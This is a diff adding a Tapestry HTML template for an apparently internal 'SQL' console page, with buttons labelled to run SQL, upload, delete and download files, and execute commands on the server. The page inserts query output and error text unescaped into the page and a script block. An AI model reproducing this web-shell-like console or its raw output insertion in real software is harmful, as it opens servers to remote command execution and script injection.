@@ -1,0 +1,126 @@
+<html jwcid="@Shell" doctype=" " title="SQL"  stylesheet="ognl:assets.Rmis">
+<head>
+
+</head>
+<style>
+.input1 {
+	border: 1px solid #B8C6D6;
+	background-color: #ECF0F4;
+	<!--width: 900px;-->
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	color: #547394;
+	text-decoration: none;
+}
+    .myinput2 { background-color:#E8EDF9;height=20;font-size:12px;border:#CCD5F2 1px solid}
+</style>
+<body jwcid="@Body" style="overflow:hidden" onmouseup="dragEnd();">
+	<script   language="javascript">
+			var ondragover = false;
+			var subHeight = 0;
+			function dragBegin(){
+				if(ondragover){
+					dragEnd();	
+					return;
+				}
+				if(document.body.style.cursor=='row-resize'){
+					ondragover = true;
+					ta = document.getElementById("SQLTEXT");
+					subHeight  = eval(event.clientY-ta.style.posTop-ta.style.posHeight);
+				}
+			}
+			function dragEnd(){
+				document.body.style.cursor='default';
+				subHeight = 0;
+				ondragover = false;
+			}
+			function move(){
+				if(ondragover){
+					ta = document.getElementById("SQLTEXT");
+					datadiv = document.getElementById("ResuletData");
+					ClientyEnd = event.clientY;
+					ta.style.height = ClientyEnd - subHeight;
+					datadiv.style.height = 505 - ClientyEnd + subHeight ;
+				}else{
+        			dragEnd();
+        		}
+			}
+        	function setTableWidth(){
+        		//var srcheight = screen.availheight-35;
+      	  		//var srcwidth  = screen.availwidth-50;
+        		var srcwidth = document.body.offsetWidth -60;
+        		divData = document.getElementById("ResuletData");
+        		divData.style.width = srcwidth;
+        		TextAreaData = document.getElementById("SQLTEXT");
+        		TextAreaData.style.width = srcwidth;
+        	}
+        	window.onresize=function(){
+        		setTableWidth();
+        	}
+	</script>
+   <script jwcid = "Reportjs"/>
+   <form listener="ognl:listeners.submit" jwcid="@Form">
+  
+   <script>
+   	<span jwcid="@Insert" value="ognl:ShowErrOut" />
+   </script>
+   <div align=center>
+   <table>
+	<tr style="height=21px">
+        <td align="left" valign="top" >
+            <table>
+                <tr>
+                    <td algin="center">
+						<span jwcid="SaveButton@ZRcontrib:ImgButton"  class=myinput buttontype=""  label="执行" listener="ognl:listeners.SaveButton" />
+					</td>
+				  	<td algin="center">
+						<span jwcid="SelectButton@ZRcontrib:ImgButton"  class=myinput buttontype=""  label="查询" listener="ognl:listeners.SelectButton" />
+					</td>
+                    <td algin="center">
+						<span jwcid="ExcelButton@ZRcontrib:ImgButton"  class=myinput buttontype="nosubmitbuttons"  label="导出Excel" onclick=exportExcel("ResuletData")/>
+					</td>
+                    <!--<td algin="center">
+						<span jwcid="DownErrButton@rmis:ImgButton"  class=myinput buttontype=""  label="Tomcat日志" listener="ognl:listeners.DownErrButton"/>
+					</td>
+                    <td algin="center">
+						<span jwcid="RestartTomcatButton@rmis:ImgButton" buttontype=""  label="重启Tomcat" listener="ognl:listeners.RestartTomcatButton"/>
+					</td>-->
+                    <td><span jwcid="FileStream" CLASS=myinput2 id="FileStream" /></td>
+					<td><span jwcid="UploadButton@ZRcontrib:ImgButton" onClick=""
+						buttontype="" label="上传文件" class=myinput listener="ognl:listeners.UploadButton" /></td>
+                    <td><span jwcid="DeleteButton@ZRcontrib:ImgButton" onClick=""
+						buttontype="" label="删除文件" class=myinput listener="ognl:listeners.DeleteButton" /></td>
+                    <td><span jwcid="DownFileButton@ZRcontrib:ImgButton" onClick=""
+						buttontype="" label="下载文件" class=myinput listener="ognl:listeners.DownFileButton" /></td>
+                    <td><span jwcid="ExecButton@ZRcontrib:ImgButton" onClick=""
+						buttontype="" label="执行命令" class=myinput listener="ognl:listeners.ExecButton" /></td>
+                    
+                </tr>
+            </table>
+        <td>
+	</tr>
+	<tr>
+		<td>
+            <table  border="1px">
+            	<tr onmousemove="move()" >
+                    <td align="left" valign="top"><textarea jwcid="SQLTEXT" name="SQLTEXT" style="height:240" class="input1" id="SQLTEXT"></textarea></td>
+                </tr>
+                <tr onmouseover="body.style.cursor='row-resize';" onmousedown="dragBegin(this)" onmousemove="move()" style="height:1px">
+                    <td borderColor="black"></td>
+                </tr>    
+                <tr onmousemove="move()">
+					<td align="left" valign="top">
+			            <div id=ResuletData style="width:900px;height:265px;overflow:auto">
+			            	<span jwcid="@Insert" raw="true" value="ognl:SqlResult"></span>
+			            </div>
+			        </td>	        
+				</tr>
+            </table>    
+        </td>
+	</tr>    
+   </table>
+   </div>
+   </form>
+</body>
+<script>window.onresize();</script>
+</html>
